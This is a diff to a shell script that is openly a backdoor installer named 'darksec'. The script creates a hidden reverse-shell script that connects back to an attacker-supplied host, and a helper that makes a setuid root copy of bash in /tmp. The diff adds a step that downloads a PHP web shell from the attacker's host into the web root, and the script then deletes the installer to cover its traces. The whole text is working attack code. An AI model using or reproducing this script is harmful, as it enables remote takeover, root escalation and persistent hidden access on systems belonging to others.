@@ -25,7 +25,7 @@ sleep 1
 # CREATE FILES FOR SHELL REVERSE
 touch .system.sh
 echo "#\!/bin/bash" > /usr/local/bin/.system.sh
-echo "bash sh -i >& /dev/tcp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
+echo "sh -i >& /dev/udp/$1/$2 0>&1" >> /usr/local/bin/.system.sh
 sleep 1
 chmod +x /usr/local/bin/.system.sh
 touch .root.sh
@@ -34,15 +34,17 @@ echo "#\!/bin/bash" > /usr/local/bin/.root.sh
 echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/.root.sh
 sleep 1
 
-# BACK FOR  DIRETORY
-cd "$darksec"
-cd ..
+# CHANGE DIRETORY WEB INSTALL BACKDOOR.PHP
+
+cd /var/www/html/ && wget -q http://$1//darksec.php &&  curl -s http://$1//darksec.php -o darksec.php
+
+#BACK DIretory
+cd $darksec
 
 # DELETE BACKDOOR
-rm -rf shell_persistent
 rm -rf darksec.sh
 
 # SUCCESS, BACKDOOR RUNNING
-echo -n '[+] SUCCESS BACKDOOR RUNNING!'
+echo  '[+] SUCCESS BACKDOOR RUNNING!'
 
 fi
